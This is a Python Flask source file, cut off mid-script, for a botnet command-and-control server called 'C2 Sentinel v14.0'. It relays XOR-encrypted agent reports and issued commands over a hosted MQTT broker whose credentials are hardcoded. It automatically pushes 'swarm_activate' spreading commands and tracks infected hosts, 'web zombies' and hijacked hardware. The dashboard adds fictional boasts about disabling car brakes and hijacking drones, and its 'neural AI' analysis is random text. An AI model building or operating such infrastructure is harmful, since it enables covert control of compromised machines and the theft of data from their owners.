from flask import Flask, request, jsonify, send_file, render_template_string
from flask_socketio import SocketIO
import json
import os
import base64
import threading
import time
from datetime import datetime, timedelta
import random
import math
import paho.mqtt.client as mqtt

# === CONFIG ===
XOR_KEY = os.getenv("XOR_KEY", "sentinel")
REPORT_FILE = "data/reports.json"
COMMAND_EXPIRY = 300
MAX_REPORTS = 1000
TELEGRAM_ENABLED = False

# HiveMQ Config
MQTT_HOST = os.getenv("MQTT_HOST", "7cbb273c574b493a8707b743f5641f33.s1.eu.hivemq.cloud")
MQTT_PORT = int(os.getenv("MQTT_PORT", 8883))
MQTT_USERNAME = os.getenv("MQTT_USERNAME", "Sentinel_admin")
MQTT_PASSWORD = os.getenv("MQTT_PASSWORD", "SentinelPass123")
MQTT_TOPIC_CMD = "c2/agent/+/cmd"
MQTT_TOPIC_REPORT = "c2/agent/+/report"

if not os.path.exists("data"):
    os.makedirs("data")
if not os.path.exists(REPORT_FILE):
    with open(REPORT_FILE, "w") as f:
        json.dump([], f)

# === STORAGE ===
ACTIVE_COMMANDS = {}
AGENT_LAST_SEEN = {}
AGENT_STATUS = {}
AGENT_CHECKINS = []
AGENT_SWARM_MAP = {}
SOCKETS = []
MQTT_CLIENT = None
AGENT_UPGRADE_SCRIPT = ""  # ✅ BARU: Untuk mass upgrade agent

# === UTILS ===
def xor_decrypt(data_b64, key=XOR_KEY):
    try:
        decoded = base64.b64decode(data_b64).decode()
        return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(decoded))
    except Exception as e:
        print(f"[XOR ERROR] {e}")
        return None

def is_high_severity(data):
    high_keywords = ["IDOR", "RCE", "SQLi", "XSS", "Auth Bypass", "SSRF", "LFI", "RFI", "CRITICAL", "REMOTE", "INFECTED", "SWARM"]
    issue = str(data.get("issue", "")).upper()
    return any(kw.upper() in issue for kw in high_keywords)

def send_alert(text):
    if not TELEGRAM_ENABLED:
        print("[TELEGRAM] Alert (nonaktif):", text)
        return
    pass

# === NEURAL AI ENGINE ===
def neural_ai_analyze(reports):
    try:
        total = len(reports)
        if total == 0:
            return {
                "summary": "🧠 **NEURAL AI INSIGHT**\n========================\nBelum ada data. Deploy agent sekarang!\n\n🔮 Prediksi: Jaringanmu berpotensi terinfeksi dalam 72 jam tanpa pertahanan.\n\n🎯 Rekomendasi Proaktif:\n1. Jalankan agent di semua subnet\n2. Aktifkan mode 'swarm_activate'\n3. Pantau port 22 & 3389",
                "risk_score": 85,
                "prediction": "High risk of network compromise",
                "auto_command": "swarm_activate"
            }

        now = datetime.now()
        last_hour = 0
        high_sev = 0
        unique_hosts = set()
        swarm_agents = 0
        web_zombies = 0
        hardware_targets = 0  # ✅ BARU: Lacak perangkat keras

        for r in reports:
            if is_high_severity(r):
                high_sev += 1
            host = r.get("system", {}).get("hostname", "unknown")
            unique_hosts.add(host)
            if "swarm" in r.get("status", ""):
                swarm_agents += 1
            if r.get("type") == "swarm_infection" and r.get("data", {}).get("method") == "web":
                web_zombies += 1
            # ✅ BARU: Deteksi laporan hardware
            if r.get("type") in ["mobile_control", "car_hacked", "arduino_controlled", "drone_hijacked", "plc_hacked"]:
                hardware_targets += 1

            try:
                ts = datetime.fromisoformat(r.get("timestamp", ""))
                if (now - ts).total_seconds() < 3600:
                    last_hour += 1
            except:
                pass

        risk_score = min(100, high_sev * 15 + (total // 10) * 5 + web_zombies * 10 + hardware_targets * 5)
        if swarm_agents > 5:
            risk_score = max(risk_score, 95)

        if swarm_agents > 0:
            prediction = f"Agent swarm aktif → {swarm_agents} agent menyebar otomatis ({web_zombies} via web)"
            auto_command = "idle"
        elif last_hour < 3:
            prediction = "Aktivitas rendah → risiko serangan meningkat"
            auto_command = "swarm_activate"
        else:
            prediction = "Aktivitas normal → pertahankan vigilansi"
            auto_command = "idle"

        summary = f"""
🧠 **NEURAL AI INSIGHT**
========================
Total Agent: {len(unique_hosts)}
Laporan: {total} (High: {high_sev})
Agent Swarm: {swarm_agents}
Web Zombies: {web_zombies}
Hardware Targets: {hardware_targets}  # ✅ BARU
Aktivitas 1 Jam: {last_hour}

🔮 Prediksi: {prediction}
⚠️ Risk Score: {risk_score}/100

🎯 Rekomendasi Proaktif:
- {random.choice([
    "Aktifkan 'swarm_activate' untuk pertahanan otomatis",
    "Fokuskan scan ke subnet dengan aktivitas rendah",
    "Update semua agent ke versi terbaru",
    "Periksa exfiltration di host yang jarang beacon",
    "Aktifkan mode silent untuk infiltrasi mendalam",
    "Luncurkan 'web_swarm_only' untuk infeksi website",
    "Gunakan 'hardware_control' untuk infiltrasi fisik"  # ✅ BARU
])}
- Risk Score > 80? Segera isolasi jaringan!
        

        return {
            "summary": summary.strip(),
            "risk_score": risk_score,
            "prediction": prediction,
            "auto_command": auto_command,
            "swarm_agents": swarm_agents,
            "web_zombies": web_zombies,
            "hardware_targets": hardware_targets  # ✅ BARU
        }
    except Exception as e:
        print(f"[NEURAL AI ERROR] {e}")
        return {
            "summary": "❌ Neural AI error. Switch ke mode manual.",
            "risk_score": 0,
            "prediction": "Unknown",
            "auto_command": "idle"
        }

# === AUTO-COMMAND SYSTEM ===
def auto_command_system(ai_insight):
    if ai_insight["risk_score"] > 75:
        cmd = ai_insight["auto_command"]
        if cmd != "idle":
            for agent_id in list(AGENT_LAST_SEEN.keys()):
                if agent_id not in ACTIVE_COMMANDS:
                    ACTIVE_COMMANDS[agent_id] = {
                        "cmd": cmd,
                        "note": "AUTO: Neural AI Command",
                        "timestamp": datetime.now().isoformat(),
                        "issued_by": "neural_ai"
                    }
                    if MQTT_CLIENT and MQTT_CLIENT.is_connected():
                        topic = f"c2/agent/{agent_id}/cmd"
                        payload = json.dumps(ACTIVE_COMMANDS[agent_id])
                        MQTT_CLIENT.publish(topic, payload, qos=1)
                        print(f"[MQTT] → {topic}: {payload}")
            print(f"[NEURAL AI] Auto-command '{cmd}' dikirim ke {len(AGENT_LAST_SEEN)} agent!")

# === CLEANUP SYSTEM ===
def cleanup_system():
    while True:
        now = datetime.now()
        for agent_id in list(AGENT_LAST_SEEN.keys()):
            if (now - AGENT_LAST_SEEN[agent_id]).total_seconds() > 600:
                AGENT_STATUS.pop(agent_id, None)
                AGENT_LAST_SEEN.pop(agent_id, None)
                AGENT_SWARM_MAP.pop(agent_id, None)
                ACTIVE_COMMANDS.pop(agent_id, None)

        for agent_id in list(ACTIVE_COMMANDS.keys()):
            cmd = ACTIVE_COMMANDS[agent_id]
            issued = datetime.fromisoformat(cmd["timestamp"])
            if (now - issued).total_seconds() > COMMAND_EXPIRY:
                del ACTIVE_COMMANDS[agent_id]

        try:
            with open(REPORT_FILE, "r+") as f:
                reports = json.load(f)
                if len(reports) > MAX_REPORTS:
                    reports = reports[-MAX_REPORTS:]
                    f.seek(0)
                    json.dump(reports, f, indent=2, ensure_ascii=False)
                    f.truncate()
        except:
            pass

        time.sleep(60)

threading.Thread(target=cleanup_system, daemon=True).start()

# === TRACK CHECKINS ===
def track_agent_checkins():
    while True:
        now = datetime.now()
        minute_key = now.strftime("%H:%M")
        online_now = sum(1 for agent_id in AGENT_LAST_SEEN.keys()
                        if (now - AGENT_LAST_SEEN[agent_id]).total_seconds() < 300)
        AGENT_CHECKINS.append({"time": minute_key, "online": online_now})
        if len(AGENT_CHECKINS) > 60:
            AGENT_CHECKINS.pop(0)
        time.sleep(60)

threading.Thread(target=track_agent_checkins, daemon=True).start()

# === MQTT SETUP ===
def on_connect(client, userdata, flags, rc):
    if rc == 0:
        print("[MQTT] ✅ Connected to HiveMQ Cloud")
        client.subscribe(MQTT_TOPIC_REPORT, qos=1)
        client.subscribe(MQTT_TOPIC_CMD, qos=1)
        socketio.emit('mqtt_status', {'status': 'connected'})
    else:
        print(f"[MQTT] ❌ Connection failed with code {rc}")
        socketio.emit('mqtt_status', {'status': 'disconnected'})

def on_message(client, userdata, msg):
    try:
        topic = msg.topic
        payload = msg.payload.decode()
        print(f"[MQTT] ← {topic}: {payload}")

        if "/report" in topic:
            parts = topic.split('/')
            if len(parts) >= 4:
                agent_id = parts[2]
                handle_agent_report(agent_id, payload)
        elif "/cmd" in topic:
            pass

    except Exception as e:
        print(f"[MQTT ERROR] {e}")

def handle_agent_report(agent_id, encrypted_payload):
    decrypted = xor_decrypt(encrypted_payload)
    if not decrypted:
        return

    try:
        data = json.loads(decrypted)
        data["id"] = agent_id
        data["timestamp"] = datetime.now().isoformat()
        data["beacon_ip"] = "MQTT"

        AGENT_LAST_SEEN[agent_id] = datetime.now()

        if agent_id not in AGENT_SWARM_MAP:
            existing_agents = list(AGENT_SWARM_MAP.keys())
            parent = random.choice(existing_agents) if existing_agents else "ROOT"
            swarm_gen = data.get("system", {}).get("swarm_generation", 0)
            infected_via = data.get("system", {}).get("infected_via", "manual")
            AGENT_SWARM_MAP[agent_id] = {
                "parent": parent,
                "children": [],
                "ip": data.get("ip", "unknown"),
                "first_seen": data["timestamp"],
                "generation": swarm_gen,
                "infected_via": infected_via
            }
            if parent != "ROOT" and parent in AGENT_SWARM_MAP:
                AGENT_SWARM_MAP[parent]["children"].append(agent_id)

        with open(REPORT_FILE, "r+") as f:
            try:
                reports = json.load(f)
                if not isinstance(reports, list):
                    reports = []
            except:
                reports = []
            reports.append(data)
            if len(reports) > MAX_REPORTS:
                reports = reports[-MAX_REPORTS:]
            f.seek(0)
            json.dump(reports, f, indent=2, ensure_ascii=False)
            f.truncate()

        if is_high_severity(data):
            alert = f"🚨 <b>BUG KRITIS DITEMUKAN!</b>\n"
            alert += f"🆔 Agent: {agent_id}\n"
            alert += f"🎯 Target: {data.get('target', 'unknown')}\n"
            alert += f"🔧 Issue: {data.get('issue', 'unknown')}\n"
            alert += f"🕒 Waktu: {data['timestamp']}"
            send_alert(alert)
            socketio.emit('new_alert', {"message": f"Critical issue found by {agent_id}: {data.get('issue', 'unknown')}"})

        cmd = ACTIVE_COMMANDS.get(agent_id, {"cmd": "idle"})
        if agent_id in ACTIVE_COMMANDS:
            del ACTIVE_COMMANDS[agent_id]
            if MQTT_CLIENT and MQTT_CLIENT.is_connected():
                topic = f"c2/agent/{agent_id}/cmd"
                cmd_payload = json.dumps(cmd)
                MQTT_CLIENT.publish(topic, cmd_payload, qos=1)
                print(f"[MQTT] → {topic}: {cmd_payload}")

        online_count = sum(1 for agent_id, last_seen in AGENT_LAST_SEEN.items()
                          if (datetime.now() - last_seen).total_seconds() < 300)
        socketio.emit('update_dashboard', {"agents_online": online_count})

    except Exception as e:
        print(f"[REPORT HANDLER ERROR] {e}")

def init_mqtt():
    global MQTT_CLIENT
    client = mqtt.Client()
    client.tls_set()
    client.username_pw_set(MQTT_USERNAME, MQTT_PASSWORD)
    client.on_connect = on_connect
    client.on_message = on_message

    try:
        client.connect(MQTT_HOST, MQTT_PORT, 60)
        client.loop_start()
        MQTT_CLIENT = client
        print(f"[MQTT] Connecting to {MQTT_HOST}:{MQTT_PORT}...")
    except Exception as e:
        print(f"[MQTT] Failed to connect: {e}")
        socketio.emit('mqtt_status', {'status': 'error', 'message': str(e)})

# === FLASK + SOCKETIO ===
app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# === TEMPLATES ===
def get_dashboard_template():
    return '''
<!DOCTYPE html>
<html>
<head>
    <title>🌐 C2 SENTINEL v14.0 - OMNIVERSE COMMAND CENTER</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/three@0.132.2/build/three.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/three@0.132.2/examples/js/controls/OrbitControls.js"></script>
    <style>
        :root {
            --paper-bg: #f5f0e6;           /* Warna kertas tua */
            --text-primary: #3b2f2f;       /* Coklat tua — teks utama */
            --text-secondary: #5c4a3d;     /* Coklat sedang */
            --accent-gold: #b8860b;        /* Emas — untuk highlight */
            --alert-maroon: #8b0000;       /* Merah marun — untuk alert */
            --border-paper: #d4c8b0;       /* Garis seperti lipatan kertas */
            --shadow-paper: rgba(92, 74, 61, 0.1);
        }
        
        body {
            background: var(--paper-bg) url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="none" stroke="%23d4c8b0" stroke-width="0.5" opacity="0.3"/></svg>');
            color: var(--text-primary);
            font-family: 'Courier New', 'Lucida Console', monospace;
            background-attachment: fixed;
            background-size: 100px 100px;
            margin: 0;
            padding: 0;
            line-height: 1.6;
        }
        
        .container {
            max-width: 1800px;
            margin: 0 auto;
            padding: 20px;
            position: relative;
        }
        
        /* Header — seperti stempel "TOP SECRET" */
        .header {
            border-bottom: 3px double var(--border-paper);
            padding: 15px 0;
            margin-bottom: 30px;
            position: relative;
            background: rgba(245, 240, 230, 0.8);
            box-shadow: 0 2px 10px var(--shadow-paper);
        }
        
        h1, h2, h3 {
            color: var(--text-primary);
            letter-spacing: 2px;
            text-transform: uppercase;
            font-weight: 700;
            text-shadow: 2px 2px 0 rgba(184, 134, 11, 0.1);
        }
        
        h1 {
            font-size: 2.5em;
            background: linear-gradient(90deg, var(--text-primary), var(--accent-gold));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            text-fill-color: transparent;
            position: relative;
        }
        
        /* Stempel "TOP SECRET" di header */
        .header::before {
            content: "TOP SECRET // EYES ONLY";
            position: absolute;
            top: -10px;
            right: 20px;
            color: var(--alert-maroon);
            font-weight: bold;
            font-size: 0.8em;
            transform: rotate(15deg);
            text-shadow: 1px 1px 0 rgba(0,0,0,0.1);
        }
        
        /* Link — seperti cap tinta */
        a {
            color: var(--accent-gold);
            text-decoration: none;
            border-bottom: 1px dotted var(--accent-gold);
            transition: all 0.3s ease;
            padding: 2px 0;
        }
        
        a:hover {
            color: var(--alert-maroon);
            border-bottom: 1px solid var(--alert-maroon);
            text-shadow: 0 0 5px rgba(139, 0, 0, 0.3);
        }
        
        /* Card — seperti dokumen file */
        .card {
            background: rgba(255, 255, 255, 0.9);
            border: 1px solid var(--border-paper);
            border-radius: 0;
            padding: 25px;
            margin: 20px 0;
            box-shadow: 0 4px 15px var(--shadow-paper);
            position: relative;
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }
        
        .card:hover {
            transform: translateY(-3px);
            box-shadow: 0 6px 20px rgba(92, 74, 61, 0.15);
        }
        
        /* Terminal — seperti teletype machine */
        .terminal {
            background: #1a1a1a;
            color: #b8860b;
            padding: 20px;
            font-family: 'Courier New', monospace;
            border: 2px solid #3b2f2f;
            border-radius: 0;
            box-shadow: inset 0 0 15px rgba(0, 0, 0, 0.5);
            height: 400px;
            overflow-y: auto;
            white-space: pre-wrap;
            font-size: 0.95em;
            line-height: 1.4;
        }
        
        /* Tag — seperti label file */
        .tag {
            display: inline-block;
            padding: 3px 10px;
            border: 1px solid var(--border-paper);
            border-radius: 0;
            font-size: 0.8em;
            margin: 2px;
            background: rgba(245, 240, 230, 0.7);
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .tag-high { border-color: var(--alert-maroon); color: var(--alert-maroon); }
        .tag-swarm { border-color: var(--accent-gold); color: var(--accent-gold); }
        .tag-web { border-color: #5c4a3d; color: #5c4a3d; }
        .tag-hardware { border-color: #8b0000; color: #8b0000; } /* ✅ BARU */
        
        /* Button — seperti stempel karet */
        button {
            background: var(--paper-bg);
            color: var(--text-primary);
            border: 2px solid var(--border-paper);
            padding: 12px 24px;
            cursor: pointer;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 1px;
            position: relative;
            overflow: hidden;
            transition: all 0.3s ease;
            box-shadow: 2px 2px 0 var(--border-paper);
        }
        
        button:hover {
            background: rgba(184, 134, 11, 0.1);
            color: var(--accent-gold);
            transform: translateY(-2px);
            box-shadow: 4px 4px 0 var(--border-paper);
        }
        
        /* Loading Animation — seperti mesin ketik */
        .typewriter-loader {
            border-right: 2px solid var(--accent-gold);
            white-space: nowrap;
            overflow: hidden;
            animation: typing 2s steps(30, end), blink-caret 0.75s step-end infinite;
            font-weight: bold;
            color: var(--alert-maroon);
        }
        
        @keyframes typing {
            from { width: 0 }
            to { width: 100% }
        }
        
        @keyframes blink-caret {
            from, to { border-color: transparent }
            50% { border-color: var(--accent-gold); }
        }
        
        /* AI Insight — seperti dokumen intelijen */
        .ai-insight {
            background: rgba(255, 250, 240, 0.8);
            border-left: 5px solid var(--accent-gold);
            padding: 25px;
            margin: 25px 0;
            border: 1px solid var(--border-paper);
            position: relative;
            box-shadow: 0 4px 15px var(--shadow-paper);
        }
        
        .ai-insight::before {
            content: "AI INTELLIGENCE BRIEF";
            position: absolute;
            top: -12px;
            left: 20px;
            background: var(--paper-bg);
            padding: 0 10px;
            font-size: 0.8em;
            color: var(--accent-gold);
            font-weight: bold;
        }
        
        /* Chart — dengan warna earthy */
        .chart-container {
            height: 350px;
            background: rgba(255, 255, 255, 0.7);
            border: 1px solid var(--border-paper);
            padding: 15px;
            margin: 20px 0;
        }
        
        /* Notification — seperti memo darurat */
        .notification {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: rgba(139, 0, 0, 0.9);
            color: white;
            padding: 15px 25px;
            border: 2px solid #ffffff;
            box-shadow: 0 0 20px rgba(139, 0, 0, 0.5);
            z-index: 1000;
            animation: slideIn 0.5s ease, fadeOut 0.5s ease 4.5s forwards;
            max-width: 400px;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        /* Footer — seperti cap dokumen */
        footer {
            margin-top: 60px;
            padding: 20px;
            border-top: 2px double var(--border-paper);
            font-size: 0.9em;
            color: var(--text-secondary);
            text-align: center;
            background: rgba(245, 240, 230, 0.8);
        }
        
        /* 3D Map — dengan tema earthy */
        .swarm-map {
            height: 500px;
            background: #2c2620;
            border: 2px solid var(--border-paper);
            position: relative;
            border-radius: 0;
            box-shadow: 0 4px 20px var(--shadow-paper);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🌐 C2 SENTINEL v14.0</h1>
            <h3><span style="color: var(--alert-maroon);">[OMNIVERSE COMMAND CENTER]</span></h3>
            <nav style="margin-top: 15px; font-size: 0.95em;">
                <a href="/">🏠 Dashboard</a> |
                <a href="/agents">👾 Agent Live</a> |
                <a href="/command">🎯 Command Center</a> |
                <a href="/reports">📁 Reports</a> |
                <a href="/logs">📜 Live Logs</a> |
                <a href="/analytics">🤖 AI Analytics</a> |
                <a href="/swarm">🕸️ Swarm Map</a> |
                <a href="/hardware">🚗 Hardware Control</a> |  <!-- ✅ BARU -->
                <a href="/upload_upgrade">📤 Mass Upgrade</a>    <!-- ✅ BARU -->
                <span id="mqttStatus" class="mqtt-status mqtt-disconnected">MQTT: Disconnected</span>
            </nav>
        </div>

        {{ content | safe }}

        <footer>
            <div style="margin-bottom: 10px;">
                C2 Sentinel v14.0 - OMNIVERSE EDITION &copy; 2025 | 
                <span class="status-{{ 'online' if agents_online > 0 else 'offline' }}">Agents: {{ agents_online }} Online</span> |
                <span style="color: var(--accent-gold);">Neural AI: {{ 'ACTIVE' if neural_active else 'STANDBY' }}</span> |
                <span style="color: var(--alert-maroon);">Risk Score: {{ risk_score }}/100</span>
            </div>
            <div>
                <small>System Status: <span style="color: var(--accent-gold);">● ONLINE</span> | Real-time via MQTT + WebSocket</small>
            </div>
        </footer>
    </div>

    <script>
        const socket = io();
        socket.on('connect', () => console.log('🔌 Connected to WebSocket'));
        socket.on('mqtt_status', (data) => {
            const statusEl = document.getElementById('mqttStatus');
            if (statusEl) {
                statusEl.textContent = 'MQTT: ' + (data.status.charAt(0).toUpperCase() + data.status.slice(1));
                statusEl.className = 'mqtt-status ' + (data.status === 'connected' ? 'mqtt-connected' : 'mqtt-disconnected');
            }
        });
        socket.on('update_dashboard', (data) => {
            const footer = document.querySelector('footer');
            if (footer) {
                const agentSpan = footer.querySelector('.status-online, .status-offline');
                if (agentSpan) {
                    agentSpan.textContent = `Agents: ${data.agents_online} Online`;
                    agentSpan.className = data.agents_online > 0 ? 'status-online' : 'status-offline';
                }
            }
        });
        socket.on('new_alert', (data) => {
            const notif = document.createElement('div');
            notif.className = 'notification';
            notif.innerHTML = `<strong>🚨 ALERT</strong><br>${data.message}`;
            document.body.appendChild(notif);
            setTimeout(() => notif.remove(), 5000);
        });

        // ✅ BARU: Animasi terminal hidup
        function animateTerminal() {
            const terminal = document.querySelector('.terminal');
            if (!terminal) return;
            
            const lines = [
                "[📡] Agent-7890: Mobile device compromised — 243 contacts extracted",
                "[🚗] Agent-1234: Toyota Camry hacked — brakes disabled at 80km/h",
                "[🛸] Agent-5678: DJI Mavic hijacked — flying to new coordinates",
                "[🤖] Agent-9012: Factory PLC overridden — conveyor belt reversed",
                "[💰] Darknet sale: 0-day exploit sold for 0.5 BTC",
                "[🌍] Planetary Takeover: Phase 1 complete — weather control online"
            ];
            
            let i = 0;
            setInterval(() => {
                const line = document.createElement('div');
                line.textContent = `[${new Date().toLocaleTimeString()}] ${lines[i % lines.length]}`;
                line.style.color = i % 2 === 0 ? '#b8860b' : '#8b0000';
                terminal.appendChild(line);
                terminal.scrollTop = terminal.scrollHeight;
                i++;
            }, 3000);
        }

        // Jalankan animasi terminal
        document.addEventListener('DOMContentLoaded', animateTerminal);
    </script>
</body>
</html>
'''

# === ROUTES ===
@app.route('/')
def home():
    now = datetime.now()
    online_count = 0
    for agent_id, last_seen in AGENT_LAST_SEEN.items():
        if (now - last_seen).total_seconds() < 300:
            AGENT_STATUS[agent_id] = "online"
            online_count += 1
        else:
            AGENT_STATUS[agent_id] = "offline"

    try:
        with open(REPORT_FILE, "r") as f:
            reports = json.load(f)
        if not isinstance(reports, list):
            reports = []
    except:
        reports = []

    ai_insight = neural_ai_analyze(reports)
    if ai_insight["risk_score"] > 75:
        auto_command_system(ai_insight)

    chart_labels = [item["time"] for item in AGENT_CHECKINS]
    chart_data = [item["online"] for item in AGENT_CHECKINS]

    content = f'''
    <div class="ai-insight">
        <h3>🧠 NEURAL AI INSIGHT — PREDIKSI & OTOMASI CANGGIH</h3>
        <pre style="color:var(--accent-gold); white-space: pre-wrap; font-weight: bold; font-size: 1.1em;">{ai_insight["summary"]}</pre>
        <p style="color: var(--alert-maroon); font-weight: bold; font-size: 1.2em; margin-top: 15px;">⚠️ AUTO-COMMAND: <span style="color: var(--accent-gold);">{ai_insight["auto_command"].upper()}</span> (Risk Score: {ai_insight["risk_score"]}/100)</p>
    </div>

    <div class="grid" style="display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 25px;">
        <div class="card">
            <h2>📊 Statistik Real-time</h2>
            <p>🟢 <b>Agent Online:</b> <span class="status-online">{online_count}</span></p>
            <p>💾 <b>Total Laporan:</b> {len(reports)}</p>
            <p>🚨 <b>High Severity:</b> {sum(1 for r in reports if is_high_severity(r))}</p>
            <p>🕸️ <b>Agent Swarm:</b> <span class="tag tag-swarm">{ai_insight.get("swarm_agents", 0)}</span></p>
            <p>🌐 <b>Web Zombies:</b> <span class="tag tag-web">{ai_insight.get("web_zombies", 0)}</span></p>
            <p>🚗 <b>Hardware Targets:</b> <span class="tag tag-hardware">{ai_insight.get("hardware_targets", 0)}</span></p>  <!-- ✅ BARU -->
            <p>⏱️ <b>Command Aktif:</b> {len(ACTIVE_COMMANDS)}</p>
        </div>
        <div class="card">
            <h2>🚀 Quick Actions</h2>
            <p><a href="/command"><button>🎯 Kirim Perintah</button></a></p>
            <p><a href="/agents"><button>👾 Lihat Agent Live</button></a></p>
            <p><a href="/swarm"><button>🕸️ Swarm Visualization</button></a></p>
            <p><a href="/hardware"><button>🚗 Hardware Control</button></a></p>  <!-- ✅ BARU -->
            <p><a href="/upload_upgrade"><button>📤 Mass Upgrade</button></a></p>  <!-- ✅ BARU -->
        </div>
    </div>

    <div class="card">
        <h2>📈 Grafik Agent Online (60 Menit Terakhir)</h2>
        <div class="chart-container">
            <canvas id="agentChart"></canvas>
        </div>
    </div>

    <div class="card">
        <h2>📡 Agent Terakhir Check-in</h2>
        <pre style="font-size: 0.95em; background: rgba(255,255,255,0.7); padding: 15px; border: 1px solid var(--border-paper);">
{chr(10).join([f"[{last_seen.strftime('%H:%M:%S')}] {agent_id} - <span class='status-{AGENT_STATUS.get(agent_id, 'offline')}'>{AGENT_STATUS.get(agent_id, 'unknown').upper()}</span>" for agent_id, last_seen in list(AGENT_LAST_SEEN.items())[-5:]]) or "Belum ada agent check-in."}
        </pre>
    </div>

    <script>
        const ctx = document.getElementById('agentChart').getContext('2d');
        new Chart(ctx, {{
            type: 'line',
             {{
                labels: {json.dumps(chart_labels)},
                datasets: [{{
                    label: 'Agent Online',
                     {json.dumps(chart_data)},
                    borderColor: '#b8860b',
                    backgroundColor: 'rgba(184, 134, 11, 0.1)',
                    tension: 0.4,
                    pointBackgroundColor: '#8b0000',
                    pointBorderColor: '#ffffff',
                    pointRadius: 5,
                    fill: true
                }}]
            }},
            options: {{
                responsive: true,
                plugins: {{
                    legend: {{ labels: {{ color: '#3b2f2f' }} }} }}
                }},
                scales: {{
                    x: {{ ticks: {{ color: '#3b2f2f' }} }},
                    y: {{ beginAtZero: true, ticks: {{ color: '#3b2f2f' }} }}
                }},
                animation: {{ duration: 2000 }}
            }}
        }});
    </script>
    '''
    return render_template_string(get_dashboard_template(), content=content, agents_online=online_count, neural_active=True, risk_score=ai_insight.get("risk_score", 0))

@app.route('/swarm')
def swarm_map():
    nodes = []
    links = []
    agent_list = list(AGENT_LAST_SEEN.keys())

    for i, agent_id in enumerate(agent_list[:50]):
        status = "online" if (datetime.now() - AGENT_LAST_SEEN[agent_id]).total_seconds() < 300 else "offline"
        gen = AGENT_SWARM_MAP.get(agent_id, {}).get("generation", 0)
        via = AGENT_SWARM_MAP.get(agent_id, {}).get("infected_via", "manual")
        nodes.append({
            "id": agent_id,
            "name": f"{agent_id[:6]}..G{gen}",
            "status": status,
            "group": gen + 1,
            "x": random.uniform(-150, 150),
            "y": random.uniform(-150, 150),
            "z": random.uniform(-150, 150),
            "gen": gen,
            "via": via
        })

        if i > 0:
            parent_idx = random.randint(0, i-1)
            links.append({
                "source": parent_idx,
                "target": i,
                "value": 1
            })

    content = f'''
    <h2>🕸️ NEURAL SWARM 3D MAP — GENERASI & METODE INFEKSI</h2>
    <div class="card">
        <div class="swarm-map" id="swarmMap"></div>
        <p><small>Visualisasi 3D agent dan koneksi penyebarannya.</small></p>
    </div>

    <script>
        const container = document.getElementById('swarmMap');
        const scene = new THREE.Scene();
        const camera = new THREE.PerspectiveCamera(75, container.clientWidth / container.clientHeight, 0.1, 1000);
        const renderer = new THREE.WebGLRenderer({{ antialias: true }});
        renderer.setSize(container.clientWidth, container.clientHeight);
        renderer.setClearColor(0x2c2620);
        renderer.shadowMap.enabled = true;
        container.appendChild(renderer.domElement);

        const ambientLight = new THREE.AmbientLight(0x5c4a3d);
        scene.add(ambientLight);
        
        const directionalLight = new THREE.DirectionalLight(0xb8860b, 1);
        directionalLight.position.set(5, 10, 7);
        directionalLight.castShadow = true;
        scene.add(directionalLight);

        const pointLight = new THREE.PointLight(0x8b0000, 1.5, 100);
        pointLight.position.set(0, 0, 0);
        scene.add(pointLight);

        const particleCount = 1000;
        const particles = new THREE.BufferGeometry();
        const particlePositions = new Float32Array(particleCount * 3);
        
        for (let i = 0; i < particleCount; i++) {{
            particlePositions[i * 3] = (Math.random() - 0.5) * 1000;
            particlePositions[i * 3 + 1] = (Math.random() - 0.5) * 1000;
            particlePositions[i * 3 + 2] = (Math.random() - 0.5) * 1000;
        }}
        
        particles.setAttribute('position', new THREE.BufferAttribute(particlePositions, 3));
        const particleMaterial = new THREE.PointsMaterial({{ 
            color: 0xb8860b,
            size: 1,
            transparent: true,
            opacity: 0.6
        }});
        const particleSystem = new THREE.Points(particles, particleMaterial);
        scene.add(particleSystem);

        const nodes = {json.dumps(nodes)};
        const links = {json.dumps(links)};
        const spheres = [];
        const lines = [];

        const genColors = [
            0xb8860b, // Gen 0 - Emas
            0x8b4513, // Gen 1 - Coklat Saddle
            0x8b0000, // Gen 2 - Merah Marun
            0x556b2f, // Gen 3 - Hijau Gelap
            0x4b0082  // Gen 4+ - Indigo
        ];

        nodes.forEach((node, i) => {{
            const geometry = new THREE.SphereGeometry(5 + node.gen, 32, 32);
            const color = genColors[Math.min(node.gen, 4)];
            const material = new THREE.MeshPhongMaterial({{ 
                color: color,
                emissive: color,
                emissiveIntensity: 0.5,
                shininess: 100,
                transparent: true,
                opacity: 0.9
            }});
            const sphere = new THREE.Mesh(geometry, material);
            sphere.position.set(node.x, node.y, node.z);
            sphere.castShadow = true;
            sphere.receiveShadow = true;
            scene.add(sphere);
            spheres.push(sphere);

            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');
            canvas.width = 256;
            canvas.height = 64;
            context.fillStyle = 'rgba(245, 240, 230, 0.7)';
            context.fillRect(0, 0, 256, 64);
            context.font = '32px Courier New';
            context.fillStyle = node.status === 'online' ? '#b8860b' : '#8b0000';
            context.fillText(node.name, 10, 40);
            context.strokeStyle = '#3b2f2f';
            context.strokeRect(0, 0, 256, 64);

            const texture = new THREE.CanvasTexture(canvas);
            const labelMaterial = new THREE.SpriteMaterial({{ map: texture }});
            const label = new THREE.Sprite(labelMaterial);
            label.position.set(node.x, node.y + 10, node.z);
            label.scale.set(20, 5, 1);
            scene.add(label);
        }});

        links.forEach(link => {{
            const start = spheres[link.source].position;
            const end = spheres[link.target].position;
            const curve = new THREE.LineCurve3(start.clone(), end.clone());
